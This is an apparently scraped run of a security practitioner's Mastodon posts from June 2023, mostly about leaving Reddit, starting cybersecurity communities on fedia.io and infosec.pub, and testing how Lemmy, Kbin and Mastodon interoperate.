For me, this seems like a prime time to simplify my own social media habits / active presence. - Reddit hostilities turning me off from there / imminent user-base collapse. - Twitter (no explanation needed). - Discord username shenanigans / discord has always been kinda annoying for non-LFG/gaming related socials. - Instagram (meta sux)- Bluesky is all hype and fomo with no substance (+ the things you mentioned) I‚Äôm almost all Mastodon and RSS/boutique blogs these days. Starting to investigate more fediverse-related properties as well (matrix, kbin, etc‚Ä¶) shellsharks @shellsharks 2023-06-11T17:53:06Z Alright! I&#39;m on Fedia (fedia. io) now (@shellsharks@fedia. io). A few initial thoughts/questions. . . - First, I created a @fedia. io user but curious if I can use my infosec. exchange identity over there. - Tried uploaded a profile pic several times but no luck for some reason. . . - Anyone know how to get Mastodon verification to work with kbin/Fedia?- I see people posting to Fedia via what appears to be Mastodon accounts which I&#39;d like to figure out how to do. . . - Does kbin have the concept of &quot;sub-reddits&quot; or is it just one large general-interest feed of threads? #fedia #kbin @jerry shellsharks @shellsharks 2023-06-11T18:16:00Z @unsunny can you help me understand how to post to / view kbin from mastodon? I see people in kbin instance I‚Äôm on (fedora. io) seemingly doing this but it has me confused. Thanks! shellsharks @shellsharks 2023-06-11T18:32:38Z @jerry @shellsharks@fedia. io yeah I noticed that right after I fired off the toot =). Your posts are showing up in the fedia. io/microblog, are you posting those there separately? I see @GossiTheDog (and others) also have parent threads there. . but how!? In the &quot;People&quot; (fedia. io/people) section there are &quot;Local&quot; users and &quot;Federated&quot; users. I can wrap my head around following a thread/post or user in kbin from my Mastodon account but not how to post something new to a specific magazine. . . Maybe one of the more recent fedia kbin posters can help me understand. Apologize and thanks in advance for the unsolicited @! @Gerald@sh. itjust. works @pauliehedron @Arrakis_Surfer @mjf_pro shellsharks @shellsharks 2023-06-11T18:36:40Z @pieceofthepie hey! maybe you can help me understand something. I&#39;ve recently joined a kbin instance (fedia. io) with a new user for that instance (@shellsharks@fedia. io). I see what appears to be people posting new posts / Microblog threads using their Mastodon identities. Do you know this can be done? This thread has some more context as well. . . https://infosec. exchange/@shellsharks/110527011806981995 I appreciate it! shellsharks @shellsharks 2023-06-11T18:43:16Z @Em0nM4stodon @jerry hey! maybe you can help me understand something.

Would be cool to select one as a community and begin using it en masse. #FediverseMigration shellsharks @shellsharks 2023-06-12T13:21:23Z @jerry #fedia seems to be down. It (maybe coincidentally) happened immediately after I tried to post to infosecpub@infosec. pub &quot;Magazine&quot; from Fedia (hopefully unrelated though). shellsharks @shellsharks 2023-06-12T13:41:02Z I&#39;ve gone ahead and created an infosec. pub community c/cybersecurity! (https://infosec. pub/c/cybersecurity). The &quot;goal&quot; if you will is to replicate Reddit&#39;s r/cybersecurity sub as a more pure stream of infosec-related content, news, research, etc. . . I understand one of the beauties of Lemmy/Kbin/fediverse at large is the decentralized nature of it all and the ability to follow magazines/communities from various instances but for those who want a little less noise and a reliable feed I figured I&#39;d give it a go. (especially given a large swath of what is being posted on Kbin/Lemmy for the forseeable future is discussion ABOUT Kbin/Lemmy) Since I created the community, it looks like I am by default the moderator. This is a responsibility that I am up for but have limited knowledge of the moderation capabilities of Lemmy currently. So I&#39;ll be learning and growing with the rest of you! It&#39;s a work in progress still, but community rules are as follows. . . - Be kind- Limit promotional activities- Non-cybersecurity posts should be redirected to other communities within infosec. pub Thanks and see ya out there! (and boost/star if you think this is a good idea, or comment and tell me I&#39;m silly if not) @jerry not looking for an &quot;endorsement&quot; of any kind but curious for your thoughts related to this experiment as proprietor of the pub =). shellsharks @shellsharks 2023-06-12T13:45:54Z Since it&#39;s unclear whether infosec. pub / fedia will become the dominant Lemmy/kbin/reddit-alternative in the wider @jerry -run world of fediverse properties, I have also created /m/cybersecurity (https://fedia. io/m/cybersecurity) on fedia. io with a mirrored goal. shellsharks @shellsharks 2023-06-12T13:58:11Z @postmodern y&#39;know I thought about doing /c/infosec instead of /c/cybersecurity but at least for me /r/cybersecurity was the most active sub over on the other site and was hoping to recapture the magic elsewhere. Personally I didn&#39;t mind the ratio of &quot;the cybers&quot; versus more technical-related content but understand the desire to filter that out. Over time, as we see if this idea can even take off it may make sense to change the expectation for what kind of posts are &quot;allowed&quot; but for now I think it makes sense to cast a wider net. On #fedia (#kbin) there is some tagging/badging capabilities that could be used by posters to signify when things are &quot;technical&quot; and therefore be used by consumers of that magazine to filter out things they may not want to see. shellsharks @shellsharks 2023-06-12T15:10:29Z @tweedge @jerry I‚Äôd love to have you on the team! I think once you post / comment within the community I can add you. shellsharks @shellsharks 2023-06-12T16:41:32Z @hacksilon Hey! I‚Äôve started a dedicated cybersecurity community/magazine on both fedia. io and infosec. pub, respectively‚Ä¶ - https://fedia. io/m/cybersecurity- https://infosec. pub/c/cybersecurity These will be pure cybersecurity related ‚Äúsubs‚Äù so feel free to follow and contribute! These two instances are growing fast so they are good places to be. We‚Äôll see if these channels take off as well! shellsharks @shellsharks 2023-06-12T17:11:17Z I&#39;m now part of Webring Enthusiasts of the Fediverse! Find me at https://fediverse-webring-enthusiasts. glitch. me/profiles/shellsharks_infosec. exchange/index. html. Thanks to @lmorchard ! shellsharks @shellsharks 2023-06-12T17:16:30Z @ivory Some instances (infosec. exchange for example) support more than the Mastodon default of 4 profile metadata rows (https://docs. joinmastodon. org/user/profile/#fields). It would be nice if the #Ivory client could accommodate this in the profile view. Thanks! shellsharks @shellsharks 2023-06-12T18:04:22Z @jerry üöÄ Others have said as much but I‚Äôll repeat in my own words. What reddit leadership seemingly fails to understand is their service isn‚Äôt ‚Äúspecial‚Äù or particularly addictive in it‚Äôs particular incarnation. The communities and the activity made Reddit what it is and those communities are very portable, especially in an age where a service (like Lemmy or kbin) can be stood up so easily. Twitter has clung to life because of its outsized influence on the world and the success people have had networking, building brands, spreading their message and sheer virality. Reddit doesn‚Äôt have these things to offer, so people will much more easily leave imo. shellsharks @shellsharks 2023-06-12T19:16:38Z @thefreehunter #ivory is a great option from a developer with a great history. shellsharks @shellsharks 2023-06-12T19:39:55Z @fletcher @tcb i‚Äôve found the overwhelming majority of #infosec blogs/sites do in fact support #rss. I&#39;ve documented a TON of infosec blogs here https://shellsharks. com/infosec-blogs and even have an importable . opml available for anyone interested. For rss service, I use Feedly. For clients, I use Feedly web app on desktop and #Reeder on iOS/iPad. That said, some promising Reddit-like services are popping up in the wake up Reddit&#39;s implosion. Fedia. io (kbin) and infosec. pub (Lemmy) are fediverse-compliant services run by the infosec. exchange admin (i. e. well run). shellsharks @shellsharks 2023-06-12T19:44:58Z @dostalcody check out #ivory on iOS shellsharks @shellsharks 2023-06-13T02:28:30Z @drrrrrck All these different service instances (of w/e - kbin, lemmy, calckey, you name it) all have separate identities and logins. That said, the activitypub protocol underpins these fediverse services and allows for some other interesting integrations. For example I can follow a Lemmy/kbin user or community from Mastodon. Similarly, it seems that I can post to Lemmy from Mastodon. But to get the most out of any one of these services it‚Äôs probably best to just create a native account. shellsharks @shellsharks 2023-06-13T03:19:58Z @drapermache Hey! Yeah it seems a lot of #Lemmy and #Kbin activity has started to happen. In fact, the venerable @jerry has (even before this Reddit mess went completely south) stood up both Lemmy and Kbin instances, respectively. . . - infosec. pub - Infosec-themed Lemmy instance- fedia. io - General-purpose Kbin instance Within both of these instances there has been very recent large scale (1k+ users on #Fedia for example) adoption. I created a general cybersecurity &quot;sub&quot; on each aptly named. . . - Fedia: https://fedia. io/m/cybersecurity- Infosec. pub: https://infosec. pub/c/cybersecurity But it&#39;s not just me, other infosec. and non-infosec-related communities/magazines exist on both of these instances. For example, @Xavier has created a #blueteam community (https://infosec. pub/c/blueteam) on infosec. pub! Which of these ultimately &quot;wins out&quot; is still tbd and specifically between fedia and infosec. pub I&#39;m not sure which Jerry will ultimately sink more time into (though he seems to never sleep and has time for everything so who knows). Either way it&#39;s a good time to get out there, network around, try things out and help start/build new communities which rely less on, well y&#39;know, the Reddit&#39;s of the world. shellsharks @shellsharks 2023-06-13T03:36:12Z @farewell_ladmin https://infosec. exchange/@jerry/110532216796960551 shellsharks @shellsharks 2023-06-13T03:55:13Z Interesting compare between #Lemmy and #Kbin. . . I follow my infosec. pub (Lemmy) and fedia. io (Kbin) profiles on my Mastodon account. The way they manifest within Mastodon is interesting. . . --Lemmy--- Post: https://infosec. exchange/@shellsharks@infosec. pub/110534850471914076- On Mastodon it shows the post title and then a simple link out to the Lemmy instance post. --Kbin--- Post: https://infosec. exchange/@shellsharks@fedia. io/110534856269820431- Here you can see the title, then the post body, but NO link to the actual post So in some ways the Kbin way blends more into the Mastodon experience, almost appearing as a normal Mastodon post whereas Lemmy kinda teases the content and then tells you to jump over there to see. shellsharks @shellsharks 2023-06-13T16:27:49Z @THM_T17 In my experience yes. I feel like 90% of my interview processes involved minimum 3 &quot;interviews&quot;, typically. . . 1. Phone Screen w/ Recruiter2. 1-1 w/ Manager3. Technical Panel w/ multiple people on immediate team This is often followed up with even MORE interviews, including (but not limited to). . . 4. Coding/technical challenge round5. &quot;Culture&quot; interview6. Meeting with department VP-level individual7. Final &quot;comp&quot; conversation w/ recruiter *Special shoutout to Airbnb who had an 11-interview process that I did not go through with after they explained it to me haha! shellsharks @shellsharks 2023-06-13T16:54:43Z Lemmy/Kbin Compare Observation(s) #2 - I posted (https://fedia. io/m/cybersecurity/t/5987/SpecterOps-First-Principles-Approach-to-Understand-Security) to #fedia in the /m/cybersecurity mag and though I follow my fedia user on Mastodon, I did not get (yet) a post in my feed. Yesterday, a vanilla post to Kbin/Fedia delivered a post to Mastodon so not sure what&#39;s up there. (@jerry ?) - However w/ infosec. pub (Lemmy), I immediately received the usual Mastodon post in my feed. ---- - In my Mastodon client (#ivory), my @shellsharks@infosec. pub user profile says I have no posts, but in the Posts tab, shows the two posts I made there (strange) - Whereas with Kbin (fedia), my user profile @shellsharks@fedia. io says I have 5 posts and when I inspect those 5 posts in the posts tab it displays what appears to be all my activity (e. g. post comments, microblog replies, boosts from that account and native Kbin posts) shellsharks @shellsharks 2023-06-14T03:23:53Z @chani @skry @jerry better not find out about this or he‚Äôll buy more domains instead of food or sleeping‚Ä¶ shellsharks @shellsharks 2023-06-14T04:04:15Z @vpz @jerry Yes! A #Kbin and #Lemmy server both exist too! - Kbin: fedia. io - Lemmy: infosec. pub If #cybersecurity / #infosec is what you‚Äôre looking for I invite you to check out both of these ‚Äúsubs‚Äù‚Ä¶ - https://fedia. io/m/cybersecurity- https://infosec. pub/c/cybersecurity shellsharks @shellsharks 2023-06-14T04:17:31Z @thefreehunter In your case, is moving your account to another instance (which mastodon/activitypub supports) not a viable option? If my server went down I‚Äôd just go to another server and all my followers would transfer and I could export&gt;import my follows‚Ä¶ shellsharks @shellsharks 2023-06-14T04:22:49Z @xxdesmus the more the merrier I say.

Maybe it has more readily available features? It seems to be where more people are gravitating anyways. I have a similar ‚Äúsub‚Äù there - https://fedia. io/m/cybersecurity. Happy to brainstorm and contribute to whatever could help successfully launch and maintain a Fediverse-based Redditesque community. shellsharks @shellsharks 2023-06-14T14:26:10Z @tweedge @jerry nice! you&#39;re added as a mod there now too. shellsharks @shellsharks 2023-06-14T14:29:36Z Prospective #kbin users/moderators/instance-owners, keep an eye on https://www. reddit. com/r/KbinMigration/comments/145bwof/the_redditors_guide_to_how_kbin_works_your/ for good info on how to use, build, maintain instances/Magazines/etc. . .

But hey, if it helps transition people away then maybe it&#39;s worth it. shellsharks @shellsharks 2023-06-14T15:18:46Z @infosecpub testing posting from #mastodon Testing, testing, 1, 2, 3. . . shellsharks @shellsharks 2023-06-14T15:23:02Z @infosecpub Alright so that works. Just @[community]@[lemmy server] with the first line being the title some new lines and then the body. As you might expect, it posts from my mastodon handle. Attempting to &quot;reply&quot; to this post sends infosec. pub into a long spin. Not sure if that&#39;s just an instance issue or if responding to a Mastodon-originated post on my Lemmy account is causing the issue. Let&#39;s see what happens when I reply to this post via Mastodon. . . shellsharks @shellsharks 2023-06-14T15:24:29Z @infosecpub So that *immediately* propagated the reply TO the infosec. pub post. COOL! Replying to the post within Lemmy still seems to be struggling though. . . shellsharks @shellsharks 2023-06-14T15:27:49Z @pieselpriemel@mastodon. online should work by going to https://fedia. io shellsharks @shellsharks 2023-06-14T15:36:14Z @infosecpub So for people who want to interact with #Lemmy from your existing #mastodon identity, it looks like you have some decent options. What&#39;s interesting is this worked from my infosec. exchange account but when trying to post directly to infosec. pub from my mastodon. social account, it did not work. Could be a mastodon. social issue? - Replying to it from a different account DID work in adding a reply to the infosec. pub post. @jerry - fascinating behavior(s) here. . . shellsharks @shellsharks 2023-06-14T15:53:53Z @infosecpub Seems like a potential usability disaster imo. If people wise up to the ability to post to Lemmy instances (or infosec. pub specifically if the issue is isolated to that instance) from Mastodon than anyone who&#39;s using Lemmy natively won&#39;t be able to interact with that post. There&#39;s no way of really easily seeing that it is of Mastodon origin outside inspecting the OP&#39;s user info (which will denote I came from infosec. exchange). You can, as the OP respond to reply threads but for standard reply-ee&#39;s you can only see/respond to the reply threads you started. For those who don&#39;t want to have separate identities across all these Fediverse services I can see the attraction of the cross-posting from Mastodon--&gt; Lemmy but this is def an issue. @jerry not sure if this is something tweakable on the Lemmy server either fixing the ability to respond to Mastodon-originated posts within Lemmy or disabling the ability to do this from Mastodon completely until it is sorted out by the Lemmy devs. shellsharks @shellsharks 2023-06-14T16:03:57Z @infosecpub One last funny thing I noticed (then I swear I&#39;m done testing this for now), when you upvote a post on Lemmy (which still works despite replies being borked), it propagates to Mastodon as a star. How whimsical! Oh and deletes propagate (mastodon-&gt;lemmy) which is cool. shellsharks @shellsharks 2023-06-14T16:17:18Z @sass @lemmyworld @infosecpub @shellsharks@infosec. pub omg now I&#39;m real confused ü§£. I can post to Lemmy instances from mastodon and randomly @ other Lemmy instances which will in turn create posts there too. @&#39;ing my Mastodon handle works and then I can reply to that post. It looks like a Lemmy user @joyjoy had no problem replying to my Mastodon-originated post so it would seem that strange issue may be isolated to infosec. pub. #Fediverse got me spinning tho. . . shellsharks @shellsharks 2023-06-14T16:21:39Z @joyjoy testing a reply to my new Lemmy friend‚Ä¶ üòÅ shellsharks @shellsharks 2023-06-14T16:25:43Z @infosecpub so I can find someones Lemmy handle, search them on Mastodon, find their posts, then reply to those posts IN mastodon and it will reply natively within Lemmy. Further, I can search for a Lemmy COMMUNITY in mastodon, browse posts and replies and respond to those as well natively within Mastodon. So a full-featured Lemmy browser could (seemingly) be built inside a Mastodon client. So interesting. . . #lemmy #mastodon #fediversemigration @ivory @radiant @jknlsn shellsharks @shellsharks 2023-06-14T16:34:52Z @jknlsn @infosecpub @radiant understandable, im sure you have your hands full as it is. With the reddit meltdown and exploding interest in projects like #lemmy, #kbin, etc. . . I see a good opportunity for devs like yourself to capitalize on that interest and develop either a native kbin/lemmy app or even add some functionality directly within a Mastodon app considering the compatibilities between these services thanks to #activitypub. Excited to see it all play out! shellsharks @shellsharks 2023-06-14T16:39:39Z @jerry @infosecpub ‚Ä™@lemmyworld‚Ä¨ users seem to be able to do this. Not sure how much effort you feel like putting into infosec. pub but enabling the ability to reply from Lemmy to mastodon originated posts seems huge. Haven‚Äôt tried all of this with #kbin / #fedia yet so stay tuned‚Ä¶ shellsharks @shellsharks 2023-06-14T18:07:50Z @aemaeth @infosecpub I haven&#39;t done any testing with pixelfed yet. Creating an account is on my list of things to do though. Testing would likely come sometime after that. shellsharks @shellsharks 2023-06-14T19:23:38Z @moonwalker https://infosec. exchange/@shellsharks/110534747649519984 üòÅ shellsharks @shellsharks 2023-06-15T00:01:02Z @malanalysis @Xavier @jerry what post/reply were you trying to reply to. If the post/reply in question originated from Mastodon I discovered that you can not reply to it natively in Lemmy. shellsharks @shellsharks 2023-06-15T03:03:48Z @4n68r You *kinda* can. Check out this thread here https://infosec. exchange/@shellsharks/110543305104286167. I was testing cross-compatibility today (with #Lemmy specifically). There‚Äôs absolutely some decent functionality with Lemmy from Mastodon but some limitations as well. shellsharks @shellsharks 2023-06-15T13:42:38Z @tweedge You already know about the ongoing efforts with infosec. pub &amp; #Fedia, so you know I&#39;m already thinking &quot;Plan B&quot;/potential Reddit parachute, but I am definitely conflicted. I&#39;ve been using Reddit for like 11 years and /r/cybersecurity has been easily where 90%+ of my activity has been. I take great pride in helping that community, getting involved, learning from what others share, etc. . . and I&#39;d love for it to stay intact. I understand that if Reddit vanished TODAY, that not everyone will just pick up and move to the next single thing, the diaspora will send people everywhere and the community as we knew it will be gone. But! Some chunk of us will land in places like Mastodon or Lemmy or Kbin or w/e and we can continue to do our thing there. As it stands today, an Apollo-less Reddit and a Reddit that has done what it has done so far is not unusable, so many of us would prefer we try to stay in hopes that it doesn&#39;t get worse. But as Reddit increasingly sees us as just little collective dollar signs we know they don&#39;t have whats in our best interests so the things we love will continue to erode. In the end, I will go where the community goes and I will continue to support the community whether it&#39;s on Reddit (maybe somewhat begrudgingly) or elsewhere. shellsharks @shellsharks 2023-06-15T15:03:36Z @darthnull I have one. Interested still? shellsharks @shellsharks 2023-06-15T15:45:22Z @darthnull bsky-social-fj2vc-sjpjj - there ya go!

Server issues presumably‚Ä¶ shellsharks @shellsharks 2023-06-16T14:16:40Z @bill Don&#39;t know if you&#39;re affiliated with any &quot;official&quot; Reddit /r/OpenBSD community or want to reach out to their mods but you could try getting listed here https://redditmigration. com to help others migrate over. This is great stuff! I did a similar thing with a #cybersecurity -related Fedia. io &amp; infosec. pub community (though whether those will be _official_ landing grounds for the Reddit sub is TBD). - https://fedia. io/m/cybersecurity- https://infosec. pub/c/cybersecurity shellsharks @shellsharks 2023-06-16T14:29:05Z For everyone creating communities (#Lemmy instances) or &quot;magazines&quot; on #Kbin instances be mindful of the very real deficiencies that exist related to moderation, as @thisismissem writes about here (https://hachyderm. io/@thisismissem/110550824230711531). We&#39;re all both excited about the promise the #Fediverse brings and equally pissed at what is going on over on Reddit but there is real *danger* in growing communities using software that might not be ready for it. Read Emelia&#39;s post to gain more understanding of the potential pitfalls (and guidance around moderation). One thing I&#39;ll add is that botching this migration due to immature software could turn people off from the idea of Reddit-esque fediverse communities indefinitely. @jerry I&#39;m certainly no expert on community creation/management much less moderating mid-large size communities but there are certainly others within the . infosec sphere (üëÄ @tweedge) who could weigh in. Maybe it would be helpful to post a guide of some kind (not saying *you* need to create it but you could help market it) which fairly warns #fedia and #infosecpub channel admins that moderation tools are lackluster and to tread carefully as they scale out. Happy to volunteer my own time/perspectives on adding something to a larger wiki for your various Fediversal properties as needed! #redditMigration #FediverseMigration shellsharks @shellsharks 2023-06-16T14:36:48Z @mrclark Been wondering this myself lately as I have some SANS certs and CISSP to renew. I feel like certs carry less weight lately and honestly I have so many to refresh. . . Certainly knowledge/learning trumps having the active letters but for certain fields (i. e. government) or clearing resume screens having the letters can still be helpful. shellsharks @shellsharks 2023-06-16T14:42:16Z @securopean There is a lot of I think unknown/misunderstood cross-functionality between Kbin/Lemmy instances and even between Kbin/Lemmy&lt;--&gt;other Fediverse software. Like I&#39;m able to view, subscribe and post/reply to other Kbin/Lemmy instances from Fedia/Infosec. pub. It&#39;s not entirely intuitive how to do it at times and I think this is something that will be learned over time and new client software created to better facilitate it. shellsharks @shellsharks 2023-06-16T15:01:31Z Happy Fedi-Friday! #Fedia and #infosecpub (to maybe a lesser degree) #Kbin / #Lemmy instances are rollin&#39;! We have two growing #cybersecurity communities there for all who are interested. - Fedia: https://fedia. io/m/cybersecurity (324 subs)- Infosec. pub: https://infosec. pub/c/cybersecurity (139 subs) I&#39;ve been adding an interesting (at least to me) article a day to fuel things up as I can. See ya out there. #redditMigration #FediverseMigration shellsharks @shellsharks 2023-06-16T17:49:31Z @tweedge Hey thanks for the update. A few thoughts. . . - I&#39;d be interested what the appetite for X-posting content would be. From what I&#39;ve seen, it seems people like to choose one over the other and especially in the case of Mastodon, NOT see things from Twitter as they don&#39;t want to support it in any way. I wonder if people on Kbin/Lemmy would feel similar that they&#39;d rather not have their feeds muddied with &quot;the bad place&quot; stuff. For those who remain on Reddit, they may be more interested in what is posted in the Fediverse. Me personally, I think the proposed idea sounds fine. - I&#39;m not interested in splintering the community or &quot;poaching&quot; folks from Reddit if they are on the fence. I would like to bring awareness to the fact that these communities exist and for those who are fleeing Reddit they can go there. If r/cybersecurity remains as always has I&#39;ll likely even still visit there myself though I continue to build and engage with folks Fedi-style. - I&#39;m open to all ideas tbh. I think finding ways to bridge the two is great (as long as people can stomach it). Feel free to keep me in the loop on discussions as they progress and I&#39;d be happy to give input and help out on projects, documentation, spreading the word, etc. . . shellsharks @shellsharks 2023-06-16T17:56:39Z @paco #mlem is available for iOS (https://join-lemmy. org/apps).

At &gt;55k users on infosec. exchange this scrolling keeps me busy. . . Sometimes I&#39;ll pop into the Federated timeline just to find folks on wacky / interesting servers. Collecting instances is a hobby of mine. shellsharks @shellsharks 2023-06-16T18:14:57Z @smfinlay @jerry Both are a work in progress, though it seems #Fedia is attracting more people overall (which makes sense as it is ‚Äúgeneral-interest‚Äù as opposed to infosec-specific like #infosecpub. Is there something you‚Äôre interested in knowing? (I think I‚Äôm going to write something up as it seems there‚Äôs quite a bit of interest from everyone on ‚Äúwhat am I getting myself into‚Äù) üòÅ shellsharks @shellsharks 2023-06-16T19:32:05Z @tweedge I can see how links to articles shared on Reddit could easily be cross-posted to Kbin/Lemmy from a bot account but for questions or even discussion prompts related to a link it would then become somewhat strange for Fedi-native folks to interact with that post unless there was some link back to Reddit to do so. (unless im misunderstanding something). It sounds like the linkage would prioritize link-based article content. In your experience do you find just a link post to have a lot of engagement or are the high-engagement posts those that are questions/prompts (maybe with a link associated with it). I like the idea of trying to bridge the two communities but would be fearful of a feed that appears to mostly be sourced from a bot (even though the original source is likely a person). This would make a somewhat fledgling Kbin/Lemmy community look wholly inorganic and potentially hurt it imo. I&#39;d be happy to join as a mod for r/cybersecurity and be an ambassador to the fedi-cybersecurity-communities. shellsharks @shellsharks 2023-06-17T03:20:59Z @alxjsn I‚Äôd take a look if you wouldn‚Äôt mind. Cheers! shellsharks @shellsharks 2023-06-18T12:40:37Z @sidoyle infosec. pub exists for #infosec -related things. It‚Äôs run by Jerry. shellsharks @shellsharks 2023-06-20T03:24:46Z @tweedge Sounds good! Let me know as updates roll through. shellsharks @shellsharks 2023-06-22T11:55:36Z @dismantl I got one. Lemme know if u still need it. shellsharks @shellsharks 2023-06-23T12:54:37Z @bbaugh @jerry Everything I do on infosec. pub seems to cause a ‚Äúspin‚Äù. But weirdly I refresh and the request seems to have gone through. shellsharks @shellsharks 2023-06-23T12:59:21Z @jerry @bbaugh Hah! Yeah I know, I&#39;m not too worried about it. I know the dev(s) are hard at work given the explosion of interest and you&#39;re working through things as you can. I&#39;m just along for the ride =). Will continue to support by throwing some $$ your way and at those devs ü§ë. shellsharks @shellsharks 2023-06-23T20:01:37Z @joshbressers I have a relatively small catalog of episodes you could listen to if you were interested - https://shellsharks. com/podcast. Working on some new shows now after taking a break. shellsharks @shellsharks 2023-06-23T21:39:04Z @jerry happy to help here if you need. I‚Äôm already ‚Äúadmin-ing / moderating‚Äù a community on there anyways. Just let me know! shellsharks @shellsharks 2023-06-23T21:54:36Z @jerry I was messing around with creating accounts early on when I was trying to sign in with my infosec. exchange identity. So may have added some extra things‚Ä¶ shellsharks @shellsharks 2023-06-23T22:06:32Z @jerry strange I have shellsharks, shellsharks@infosec. exchange and shellsharks@fedia. io accounts listed‚Ä¶ weird. shellsharks @shellsharks 2023-06-24T12:11:41Z @tweedge hey - out of curiosity, how do you host cybersecurity. theater? Been thinking of standing up a small instance. Thanks! shellsharks @shellsharks 2023-06-25T03:17:07Z Promising #Lemmy (&amp; #kbin compatible) iOS client #memmy - https://github. com/gkasdorf/memmy. Pretty good feature set at v0. 1 - subscribe cross-instance- community/user/post search- look at local/subbed/all feed- some themes- account notifications Get in on the TestFlight while you can! Shout out to @gavinkasdorf@mastodon. social! Will be contributing to this project for sure. #threadiverse shellsharks @shellsharks 2023-06-25T13:20:08Z @samir @thisismissem @jerry @tweedge Don‚Äôt get me wrong, I‚Äôm excited about the state of things and encouraging others to jump in same as I have. I think this is fair warning for those communities that might have explosive growth and more at risk of being exploited due to moderation challenges at larger scale. shellsharks @shellsharks 2023-06-25T13:50:05Z @samir @thisismissem @jerry @tweedge I see from your profile friend that you are a real Fediverse proponent and that‚Äôs great! We are the same in that regard =). It‚Äôs strange that your takeaway from my original post was anything but a simple message of caution. I certainly never mentioned anything related to discouraging the deployment of instances or inviting others. As for ‚Äúspecifics‚Äù, I‚Äôd suggest reading the linked thread in the original post. I‚Äôll add that I‚Äôm not worried about instance admins, more so about those who are looking to forklift communities from Reddit who might not understand what is available to them in terms of moderation and tooling - I certainly didn‚Äôt know but am learning as I go. (Specifically, I am referring to community creators, which is far different than an instance admin/creator. ) FWIW, I think the time IS now. Let‚Äôs embrace the #threadiverse, contribute and support the devs and community that is making it happen and help people land safely in this brave (and better) new world! shellsharks @shellsharks 2023-06-26T00:54:37Z @jerry Hey! Hope all is well with your hand and various home projects =). Hope you&#39;re not &quot;sinking&quot; too much time into them (see what I did there?). Just wanted to bounce a few things off you related to infosec. pub. . . - Icon and Banner: Not sure if you have any candidate graphics for this but if not maybe we could solicit the community? I&#39;d also be willing to take a shot at making something (though I mostly just use a vector graphic app to make logos). I also have a buddy who is a gifted artist who might be willing to make something if we had an idea in mind. - Description / Sidebar / Legal: These are fields available for the Lemmy instance that are currently blank. Happy to draft some stuff up and see what you think if you don&#39;t already have something you&#39;re interested in putting there. - In general, I want to help if I can with some of these general &quot;administrative&quot; tasks in addition to moderation but don&#39;t want to overstep =). - Despite kbin&#39;s hot start, it seems Lemmy has gained some ground from what I can tell (in terms of stability, etc. . . ). How are you feeling about the future of both of your instances? - I don&#39;t suspect we&#39;ll have A LOT of things to really discuss related to the instance and understand you are unfathomably busy but wanted to see what you thought the best medium for this type of discussion was going forward (could just be here on Mastodon - or Matrix or w/e) - Finally, working on a &quot;threadiverse&quot; post for the blog but it will be heavily focused on how infosec. pub/fedia users can make the most of the software. I&#39;ll share when it&#39;s done. After playing with it a lot more I think it&#39;s pretty promising, even in it&#39;s relatively immature state. Finally, just wanted to privately thank you (I know you get a lot of these) for the insane amount of work you put in to all of these things. I&#39;ve really become a Fediverse junkie in the last few months and I honestly don&#39;t know if that would be true had it not been for the work you&#39;ve done and the communities your work has enabled to flourish. Appreciate it all and feel free to reach out if you have anything else you feel I could help out with. Cheers! shellsharks @shellsharks 2023-06-26T01:06:44Z @jerry Sounds good on the logo, privacy policy &amp; rules. I&#39;m good with Matrix and also have signal so w/e works best for ya. shellsharks @shellsharks 2023-06-26T02:57:54Z Wanna go full- #threadiverse ? The steps. . . 1. Create a #kbin or #lemmy account on an instance of your choosing (might I suggest infosec. pub?) #infosecpub 2. Download a Lemmy client (they are somewhat sparse at the moment but #memmy on iOS is what I&#39;m using currently) if mobile scrolling is your jam 3. Reference sub. rehab, redditmigration. com or https://www. quippd. com/writing/2023/06/15/unofficial-subreddit-migration-list-lemmy-kbin-etc. html to find communities you are interested in. 4. Use the mobile client&#39;s search feature (memmy has this but your client may not) or your instances native search capability to find and subscribe to all the communities you&#39;ve found from the step above. Note: you should have no issue subbing to Lemmy OR Kbin communities (/magazines) 5. Yes! You can sub to communities on other instances from your own. By doing so, you can build an aggregate feed of all your subbed communities and boom! The worry of fractured communities can be (partially imo) mitigated. 6. Scroll to your heart&#39;s content, comment on things, upvote, etc. . . It&#39;s VERY similar imo to my old Reddit browsing process. But with all the fun of exploring an entirely new space. I&#39;m loving the novelty of it all and actually finding some great stuff that&#39;s out there! Yes, there is still lots of work to be done with this software and there&#39;s no telling whether these communities will thrive into the future, but I for one am excited about the prospects and will be putting my time into it. shellsharks @shellsharks 2023-06-26T03:01:00Z @tweedge Ay! That&#39;s awesome. How has that sub been since the blackout/protest? I&#39;ll jump in there and accept the invite. Happy to put together an AMA as well. Weekday might be better as I normally have more time for &quot;computering&quot; üòÖ. shellsharks @shellsharks 2023-06-26T03:16:51Z @tweedge Sure, can get into the GitHub at some point in the future. As for timing, I&#39;m actually expecting a baby soon (whaaaa!). So at some point I&#39;m going to have that goin&#39; on. Weirdly enough, I suspect I&#39;ll have time to spare since I&#39;ll be off work and up all hours of the night anyways. My wife is due 7/9 but could really be any day now. So for scheduling the AMA, the first week of July might be good or maybe the third/fourth weeks. That first week once the baby is born might be a doozy for me. Fun life stuff, sorry haha. shellsharks @shellsharks 2023-06-26T12:36:35Z @jerry Have you looked into this https://fediseer. com? &quot;Claiming&quot; an instance seems easy enough (https://lemmy. dbzer0. com/post/185949). Thought I&#39;d share. shellsharks @shellsharks 2023-06-26T18:34:53Z Are there any #threadiverse (#kbin / #lemmy) enthusiasts who would be interested in coming on a #podcast (my show specifically, https://shellsharks. com/podcast) to discuss topics including the following #fediverse, threadiverse, #redditmigration, #mastodon, etc. . . ? Even better if you happen to be an instance or community admin and are looking to cultivate communities there. If so, please send me a message and let&#39;s chat! shellsharks @shellsharks 2023-06-26T18:46:41Z @invisibit honestly think @jerry might be the busiest person in the fediverse haha. That said, if you&#39;re interested Jerry now or whenever, it&#39;d be awesome to chat! No pressure though. This time around I&#39;m angling for someone ideally who has been displaced from Reddit and taken up residence on Lemmy/Kbin. shellsharks @shellsharks 2023-06-26T19:02:30Z @kpwn bird. makeup would work for read-only yeah? https://mastodon. social/@awilbert/109553409408694575 shellsharks @shellsharks 2023-06-26T19:04:04Z @kpwn ah maybe. Haven‚Äôt been following. May be other bridges‚Ä¶ hope you find somethin! shellsharks @shellsharks 2023-06-28T19:13:25Z @jerry On infosec. pub one user (at)emzaid sent the following. . Perhaps taking a look into. Hey! Hope you are well. I wasn‚Äôt quite sure how to best report shit lol, but you might want to look at de-federating from https://exploding-heads. com/ they are a right wing hate group, that makes homophobic memes (and I‚Äôm sure more, I didn‚Äôt dive to deep as I didn‚Äôt have to‚Ä¶). Just wanted to pass it along. Also, if there is 